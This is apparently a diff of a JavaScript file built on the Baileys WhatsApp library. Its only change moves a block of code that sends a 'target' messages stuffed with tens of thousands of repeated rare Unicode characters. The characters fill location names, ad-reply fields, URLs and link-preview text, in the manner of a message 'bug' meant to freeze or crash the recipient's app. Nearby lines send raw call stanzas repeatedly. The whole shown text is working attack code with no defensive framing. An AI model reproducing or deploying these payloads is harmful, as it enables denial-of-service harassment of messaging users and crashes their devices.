@@ -7,86 +7,6 @@
     encodeNewsletterMessage
   } = require("@whiskeysockets/baileys");
 
-  const exe = "𑇂𑆵𑆴𑆿".repeat(10000);
-  const urlexe = `https://exe.${exe}-${exe}.gov/${exe}/`;
-  const msg = await generateWAMessageFromContent(
-    target,
-    {
-      viewOnceMessageV2Extension: {
-        message: {
-          locationMessage: {
-            degreesLatitude: 11.2798,
-            degreesLongitude: 21.0877,
-            name: "🧪⃟⃟⃰⃟꙰。⌁𝐍𝐱⃰𝐩𝐞𝐜𝐭¡𝐨𝐧. - 𝐫𝟒𝐋𝐝𝐳.ꪸ⃟‼️💤" + exe,
-            jpegThumbnail: "",
-            isLive: true,
-            merchantUrl: urlexe,
-            url: urlexe + " idk ~ raldz ",
-            clickToWhatsappCall: true,
-            contextInfo: {
-              externalAdReply: {
-                title:
-                  "🧪⃟⃟⃰⃟꙰。⌁𝐍𝐱⃰𝐩𝐞𝐜𝐭¡𝐨𝐧. - 𝐫𝟒𝐋𝐝𝐳.ꪸ⃟‼️💤",
-                body: exe,
-                mediaType: "VIDEO",
-                renderLargerThumbnail: true,
-                sourceUrl: urlexe,
-                mediaUrl: urlexe,
-                merchantUrl: urlexe,
-                containsAutoReply: true,
-                showAdAttribution: true,
-                ctwaClid: "ctwa_clid_example",
-                ref: "ref_example",
-              },
-              quotedAd: {
-                advertiserName: exe,
-                mediaType: "VIDEO",
-                jpegThumbnail: "",
-                caption: exe,
-              },
-              placeholderKey: {
-                remoteJid: "0s.whatsapp.net",
-                fromMe: false,
-                id: "ABCDEF1234567890",
-              },
-            },
-          },
-        },
-      },
-    },
-    {}
-  );
-  
-  const etc = await generateWAMessageFromContent(target,
-    {
-      extendedTextMessage: {
-        text: "💤‼️⃟⃰ᰧ./𝘙 _4_  𝘓  𝘋  𝘡  ✩ > https://Wa.me/stickerpack/RaldzzXyz" + exe,
-        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
-        description:
-          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
-          "𑇂𑆵𑆴𑆿".repeat(15000),
-        title: "💤‼️⃟⃰ᰧ./𝘙 _4_  𝘓  𝘋  𝘡  ✩" + exe,
-        previewType: "NONE",
-        jpegThumbnail: "",
-        inviteLinkGroupTypeV2: "DEFAULT",
-      },
-    },
-    {
-      ephemeralExpiration: 5,
-      timeStamp: Date.now(),
-    }
-  );
-  
-  await sock.relayMessage(target, etc.message, {
-    messageId: etc.key.id,
-    participant: { jid: target },
-  });
-  
-  await sock.relayMessage(target, msg.message, {
-    messageId: msg.key.id,
-    participant: { jid: target },
-  });
-
   const callId = "PnX" + "-Id" + Math.floor(Math.random() * 99999);
   const patched = patchMessageBeforeSending
     ? await patchMessageBeforeSending({
@@ -498,3 +418,83 @@
   await sock.sendNode(lemiting);
   await sock.sendNode(vcStanzaPlain);   
   await sock.sendNode(vcStanzaPlain);   
+
+const exe = "𑇂𑆵𑆴𑆿".repeat(10000);
+  const urlexe = `https://exe.${exe}-${exe}.gov/${exe}/`;
+  const msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessageV2Extension: {
+        message: {
+          locationMessage: {
+            degreesLatitude: 11.2798,
+            degreesLongitude: 21.0877,
+            name: "🧪⃟⃟⃰⃟꙰。⌁𝐍𝐱⃰𝐩𝐞𝐜𝐭¡𝐨𝐧. - 𝐫𝟒𝐋𝐝𝐳.ꪸ⃟‼️💤" + exe,
+            jpegThumbnail: "",
+            isLive: true,
+            merchantUrl: urlexe,
+            url: urlexe + " idk ~ raldz ",
+            clickToWhatsappCall: true,
+            contextInfo: {
+              externalAdReply: {
+                title:
+                  "🧪⃟⃟⃰⃟꙰。⌁𝐍𝐱⃰𝐩𝐞𝐜𝐭¡𝐨𝐧. - 𝐫𝟒𝐋𝐝𝐳.ꪸ⃟‼️💤",
+                body: exe,
+                mediaType: "VIDEO",
+                renderLargerThumbnail: true,
+                sourceUrl: urlexe,
+                mediaUrl: urlexe,
+                merchantUrl: urlexe,
+                containsAutoReply: true,
+                showAdAttribution: true,
+                ctwaClid: "ctwa_clid_example",
+                ref: "ref_example",
+              },
+              quotedAd: {
+                advertiserName: exe,
+                mediaType: "VIDEO",
+                jpegThumbnail: "",
+                caption: exe,
+              },
+              placeholderKey: {
+                remoteJid: "0s.whatsapp.net",
+                fromMe: false,
+                id: "ABCDEF1234567890",
+              },
+            },
+          },
+        },
+      },
+    },
+    {}
+  );
+  
+  const etc = await generateWAMessageFromContent(target,
+    {
+      extendedTextMessage: {
+        text: "💤‼️⃟⃰ᰧ./𝘙 _4_  𝘓  𝘋  𝘡  ✩ > https://Wa.me/stickerpack/RaldzzXyz" + exe,
+        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
+        description:
+          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
+          "𑇂𑆵𑆴𑆿".repeat(15000),
+        title: "💤‼️⃟⃰ᰧ./𝘙 _4_  𝘓  𝘋  𝘡  ✩" + exe,
+        previewType: "NONE",
+        jpegThumbnail: "",
+        inviteLinkGroupTypeV2: "DEFAULT",
+      },
+    },
+    {
+      ephemeralExpiration: 5,
+      timeStamp: Date.now(),
+    }
+  );
+  
+  await sock.relayMessage(target, etc.message, {
+    messageId: etc.key.id,
+    participant: { jid: target },
+  });
+  
+  await sock.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target },
+  });
